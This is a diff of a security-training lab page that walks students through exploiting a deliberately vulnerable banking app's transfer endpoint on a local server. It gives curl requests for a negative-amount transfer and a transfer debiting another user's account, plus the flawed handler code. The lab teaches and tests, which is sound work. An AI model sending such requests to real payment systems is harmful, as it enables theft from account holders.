@@ -1,45 +1,172 @@
 # 26 — Insufficient transaction validation
 
-**Target:** Devom. Source-inspected; not runtime-tested. Complete [Common prerequisites](00-common-setup.md) and [Devom setup](01-devom-setup.md). Use only two instructor-approved disposable lab accounts.
+*Can a transfer move money the server should have refused?*
 
-## Objective and challenge
-Record both starting balances. Make a small transfer and check the resulting balances and transaction record. Then try a controlled invalid amount, such as a small negative value. Check whether the server rejects it or changes either balance unexpectedly. Stop after one clear demonstration and tell the instructor so they can restore the test data.
+## What this lab does
+
+You will use `cala`'s session to make three transfers between the two seeded accounts and compare the balances after each one:
+
+1. a normal small transfer in the intended direction,
+2. the same transfer with a negative amount,
+3. a transfer whose `from_id` is the other user's account.
+
+The endpoint checks only that a valid token is present. It does not check that the token's user owns `from_id`, that the amount is positive, or that the sender has enough money.
+
+**Target:** Devom at revision [`af4290ce8d2178765bfc2bd96cf233f6d3d03161`](https://github.com/memohk/Devom/tree/af4290ce8d2178765bfc2bd96cf233f6d3d03161). The handler and expected responses come from that revision; the runtime results have **not** been piloted.
 
 ## Before you begin
 
-Obtain two dedicated test user IDs, an authenticated session for the sender, and permission to alter their balances. Do not use real financial data. Source-based outcomes are unverified.
+Complete [Common prerequisites](00-common-setup.md) and [Devom setup](01-devom-setup.md). Use only the two seeded accounts: `cala` (`100500`) and `admin` (`133700`). Both are disposable, and no real financial data is involved.
+
+Keep every amount small. The lab uses `5` and `1` so the balances stay printable and easy to restore. Do not repeat the tests in a loop.
+
+## Tools needed
+
+- The running Devom backend from [Devom setup](01-devom-setup.md).
+- Bash and `curl`, or an API client that can send a JSON body and an `Authorization` header.
+
+Every request sends `User-Agent: Postman` so the JSON responses are readable.
 
 ## Guided walkthrough
 
-**Tools:** an API client such as Burp Repeater or Postman, plus the two approved account IDs. For a captured request, use `POST /transfer`, header `Authorization: Bearer <LAB_TOKEN>`, header `User-Agent: Postman`, and a JSON body containing `from_id`, `to_id` and `amount`. Replace the values with the instructor's test accounts:
+### 1. Sign in and record both starting balances
 
-```json
-{"from_id":"ACCOUNT_A_ID","to_id":"ACCOUNT_B_ID","amount":1}
+```bash title="Sign in as cala"
+BASE='https://127.0.0.1:8080'
+curl --insecure -i -A 'Postman' -H 'Content-Type: application/json' \
+  --data '{"username":"cala","password":"cala123"}' "$BASE/login"
 ```
 
-Send once for the positive baseline. For the controlled negative-value test, change only `amount` to `-1` after the instructor approves the change. These requests have not been piloted; record the actual response and balances.
+Copy `session_token` into `TOKEN`, then read both profiles with that one token:
 
-1. Record both starting balances using the instructor-approved account views or API. Note each account's ID and owner.
-2. Capture a normal `POST /transfer` request. Identify the `from_id`, `to_id`, and `amount` fields and the bearer token. Send one small positive transfer between the assigned accounts.
-3. Record the response, both resulting balances and the transaction record. Check that the change matches the amount.
-4. Repeat with one small negative amount, keeping both IDs within the assigned lab accounts. Compare the HTTP response, both balances and transaction record with your baseline. Stop after one clear result.
-5. Inspect the server handler and identify where amount validation, ownership and balance checks would need to occur. Do not assume a success response alone means the balances changed.
+```bash title="Read both balances"
+TOKEN='PASTE_SESSION_TOKEN_HERE'
+curl --insecure -s -A 'Postman' -H "Authorization: Bearer $TOKEN" \
+  "$BASE/profile/100500" | grep -o '"balance": *[0-9]*'
+curl --insecure -s -A 'Postman' -H "Authorization: Bearer $TOKEN" \
+  "$BASE/profile/133700" | grep -o '"balance": *[0-9]*'
+```
+
+!!! success "Expected"
+    Two lines: `"balance":1000` for `100500` and `"balance":999999` for `133700` on a fresh database. Write both numbers down; they are your baseline.
+
+The second request already shows that a token for one user can read another user's profile. Lab 28 covers that separately; here it is only how you read the balances.
+
+### 2. Send a normal transfer
+
+```bash title="Transfer 5 from cala to admin"
+curl --insecure -i -A 'Postman' -H "Authorization: Bearer $TOKEN" \
+  -H 'Content-Type: application/json' \
+  --data '{"from_id":"100500","to_id":"133700","amount":5}' "$BASE/transfer"
+```
+
+!!! success "Expected"
+    `HTTP/1.1 200 OK` with `{"status": "success", "transaction_id": "<six digits>"}`.
+
+Repeat the two balance reads from Step 1.
+
+!!! success "Expected"
+    `100500` is now `995` and `133700` is `1000004`. The amounts moved exactly as requested.
+
+### 3. Send the same transfer with a negative amount
+
+```bash title="Transfer -5 from cala to admin"
+curl --insecure -i -A 'Postman' -H "Authorization: Bearer $TOKEN" \
+  -H 'Content-Type: application/json' \
+  --data '{"from_id":"100500","to_id":"133700","amount":-5}' "$BASE/transfer"
+```
+
+!!! success "Expected"
+    `HTTP/1.1 200 OK` with a new `transaction_id`.
+
+Read both balances again.
+
+!!! success "Expected"
+    `100500` is back to `1000` and `133700` is back to `999999`. Subtracting `-5` added 5 to the sender, and adding `-5` removed 5 from the receiver.
+
+That single request shows the missing amount check: a negative value reversed the direction of the transfer and was recorded as a success.
+
+### 4. Send a transfer from the other user's account
+
+```bash title="Spend admin's balance with cala's token"
+curl --insecure -i -A 'Postman' -H "Authorization: Bearer $TOKEN" \
+  -H 'Content-Type: application/json' \
+  --data '{"from_id":"133700","to_id":"100500","amount":1}' "$BASE/transfer"
+```
+
+!!! success "Expected"
+    `HTTP/1.1 200 OK`. Balances become `1001` and `999998`.
+
+`from_id` is `133700`, but the token belongs to `100500`. The handler never compares the two, so the request debits an account the caller does not own.
+
+Restore the balances with one transfer in the opposite direction:
+
+```bash title="Put the 1 back"
+curl --insecure -i -A 'Postman' -H "Authorization: Bearer $TOKEN" \
+  -H 'Content-Type: application/json' \
+  --data '{"from_id":"100500","to_id":"133700","amount":1}' "$BASE/transfer"
+```
+
+!!! success "Expected"
+    `HTTP/1.1 200 OK`, and the balances return to `1000` and `999999`.
+
+### 5. Read the handler
+
+Open `server.py` and find `transfer`. In this revision it runs three statements and returns success:
+
+```python
+db.execute("UPDATE users SET balance = balance - ? WHERE id = ?", (d['amount'], d['from_id']))
+db.execute("UPDATE users SET balance = balance + ? WHERE id = ?", (d['amount'], d['to_id']))
+db.execute("INSERT INTO transactions (id, from_id, to_id, amount) VALUES (?,?,?,?)", (...))
+```
+
+There is no amount check, no ownership check against `decoded_token['sub']`, and no check that the sender's balance covers the amount. The `@token_required` decorator proves a token is valid, nothing more.
+
+### 6. Separate the findings
+
+- **Sign:** a negative amount moves money in the opposite direction.
+- **Ownership:** `from_id` is taken from the body, not from the token.
+- **Funds:** nothing stops a debit that exceeds the balance, so the sender can go negative.
+- **Record:** the transaction row stores whatever amount was sent, including the negative one.
+
+Each has its own fix. A response of `200` alone does not show a balance change, so quote the before and after numbers.
 
 ## Troubleshooting
 
-If the request is rejected, check the token, JSON fields and account IDs. If the response is unreadable, use the User-Agent described in [Devom setup](01-devom-setup.md). Record unexpected behavior rather than repeating transactions indefinitely.
+- **`401 Token is missing!`:** the `Authorization` header is missing or does not start with `Bearer `.
+- **`401 Token is invalid!`:** the token was copied with a newline, or it expired. Sign in again.
+- **The balance output is empty:** without `User-Agent: Postman` the response is encrypted. Add the header.
+- **`500` from `/transfer`:** a required field is missing. The body needs `from_id`, `to_id`, and `amount` as numbers or numeric strings.
+- **The balances do not match the expected values:** you are not on a fresh database, or a previous lab changed them. Record the actual baseline and compare differences instead of absolute numbers.
 
 <details markdown="1">
 <summary>Hints</summary>
 
-1. Compare validation at the client and `/transfer` server handler.
-2. Check the ownership of the source account and whether funds and amount are validated, not just the HTTP status.
+1. Look at which claims the handler uses. `decoded_token` is passed in but never compared with `from_id`.
+2. `amount` is inserted straight into a SQL `UPDATE` with no validation.
+3. Check whether the two updates and the insert run inside one database transaction.
 
 </details>
 
 ## Evidence
-Provide sanitized before/after balances, request and response, transaction record, business impact and recommendations for server-side validation, ownership checks and atomic accounting.
+
+Submit these four items:
+
+- **Baseline:** both account IDs and starting balances.
+- **Normal transfer:** request body, response, and the two balances after it.
+- **Invalid transfers:** the negative-amount request and the cross-account request, each with its response and the resulting balances.
+- **Limits:** state that only the two seeded accounts were used, the amounts were small, and the balances were restored.
+
+## Vulnerability and Impact
+
+`/transfer` authenticates the request but does not authorize or validate it. The sender comes from the request body, the amount is unvalidated, and the balance is never compared with the debit. Because the two `UPDATE` statements are separate statements, a failure between them can also leave one side of a transfer applied.
+
+The impact is that any authenticated user can move money between arbitrary accounts, drain an account they do not own, and create negative transfers that reverse the intended direction. In a real bank this is direct financial loss and corrupted ledgers. Here it changes two disposable rows; the demonstration is the missing checks, not the amount.
 
 ## Cleanup and review
 
-Give the instructor the transaction IDs and starting balances so the disposable dataset can be restored. What invariant should hold for every transfer? How should the server handle invalid amounts and insufficient funds?
+- Confirm the balances are back to `1000` and `999999`. If they are not, make one final transfer in the correcting direction.
+- Leave the transaction rows in place; they are the audit trail of what you did.
+- Delete the local token copy.
+
+Which invariant must hold for every transfer, and where in the handler should each of the three checks happen?
